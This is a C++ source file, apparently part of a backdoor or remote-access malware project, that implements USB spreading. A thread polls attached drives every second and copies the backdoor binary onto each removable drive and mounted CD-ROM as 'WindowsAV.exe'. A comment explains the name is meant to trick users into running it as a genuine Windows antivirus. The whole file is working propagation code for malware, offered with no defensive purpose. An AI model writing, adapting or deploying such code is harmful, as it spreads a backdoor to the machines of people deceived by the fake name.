#include "usbb.hpp"

/*
Note, The Attributes of "WindowsAV.exe" will not be set to hidden because
of it's name some might fall and click on it thinking it's Legit Windows Anti Virus.

*/
void createFiles(const char* bckdoorPath, const char* usbPathDest){
    /*
        Copy Path to destination.
    */
    std::ifstream  src(bckdoorPath, std::ios::binary);
    std::ofstream  dst(usbPathDest, std::ios::binary);
    dst << src.rdbuf();
}

DWORD WINAPI USB_INJECT(LPVOID lpParameter){
    supercharge variables;
    char user[UNLEN + 1];
    DWORD length = UNLEN + 1;
    DWORD mxpath = MAX_PATH;
    char logicalDrives[mxpath];
    char* oneDrive;
    UINT uRes;
    DWORD cdcheck;
    DWORD usbCheck;
    std::ostringstream fpath;
    while(true){
        DWORD dwResult = GetLogicalDriveStrings(mxpath, logicalDrives);
        if(dwResult > 0 && dwResult <= MAX_PATH){
            oneDrive = logicalDrives;
            while(*oneDrive){
                oneDrive += strlen(oneDrive) + 1;
                uRes = GetDriveTypeA(oneDrive);
                fpath.clear();
                fpath.str("");
                fpath << oneDrive << "WindowsAV.exe";
      
                //std::string destination = fpath.str() + "WindowsAV.exe";
                if(uRes == DRIVE_REMOVABLE){
                    //std::cout << oneDrive << " detected as Removeable drive -> " << uRes << std::endl;
                    // Open file for checking.
                    std::ifstream check(fpath.str().c_str()); // C const char 
                    if(!check){
                        // if it doesn't exist. Copy it.
                        // std::cout << "Copying payload to " << fpath.str().c_str() << "\n";
                        createFiles(variables.AgentLocation().c_str(), fpath.str().c_str());
                    } 
                    

                } else if(uRes == DRIVE_CDROM){
                    // std::cout << oneDrive << " detected as CD ROM -> " << uRes << std::endl;
                    cdcheck = GetFileAttributesA(oneDrive);
                    if(cdcheck != INVALID_FILE_ATTRIBUTES){
                        // std::cout << oneDrive << " is mounted." << std::endl;
                        createFiles(variables.AgentLocation().c_str(), fpath.str().c_str());
                    } 
                    
                }
            }
            Sleep(1000);
        }
    }
}
